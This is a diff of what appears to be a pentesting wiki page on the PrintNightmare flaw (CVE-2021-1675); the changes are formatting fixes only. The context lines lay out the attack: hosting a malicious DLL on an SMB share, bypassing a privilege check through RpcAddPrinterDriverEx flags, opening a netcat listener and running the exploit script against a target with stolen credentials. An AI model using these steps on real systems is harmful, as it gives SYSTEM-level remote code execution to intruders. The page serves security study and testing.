@@ -24,7 +24,7 @@ In a detailed blogpost ([here](https://cyberwatch.fr/actualite/cve-2021-34527-co
 
 1. The attacker stores the driver DLL file on a SMB share reachable from the server.
 2. The client creates a [`DRIVER_INFO_2`](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/39bbfc30-8768-4cd4-9930-434857e2c2a2) object containing the path to the attacker's DLL and passes it into the DRIVER\_CONTAINER object.
-3. The client calls [`RpcAddPrinterDriverEx`](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b) with the `DRIVER_CONTAINER` to load the attacker's DLL into the server's dynamic library and with multiple bit values within the `dwFileCopyFlags` **** in order to bypass the `SeLoadDriverPrivilege` **** privilege verification by the server.
+3. The client calls [`RpcAddPrinterDriverEx`](https://learn.microsoft.com/en-us/openspecs/windows\_protocols/ms-rprn/b96cc497-59e5-4510-ab04-5484993b259b) with the `DRIVER_CONTAINER` to load the attacker's DLL into the server's dynamic library and with multiple bit values within the `dwFileCopyFlags` in order to bypass the `SeLoadDriverPrivilege` privilege verification by the server.
 4. The attacker's DLL is executed on the server within `SYSTEM` context.&#x20;
 
 ### Constraints
@@ -64,7 +64,8 @@ smbserver.py -smb2support "WHATEVERNAME" /workspace/smb/
 nc -lvnp $LOCAL_PORT
 
 # Run the exploit
-CVE-2021-1675.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP '\\$LOCAL_IP\$SHARE\remote.dll'</code></pre>
+CVE-2021-1675.py $DOMAIN/$USER:$PASSWORD@$TARGET_IP '\\$LOCAL_IP\$SHARE\remote.dll'
+</code></pre>
 {% endtab %}
 
 {% tab title="Windows" %}
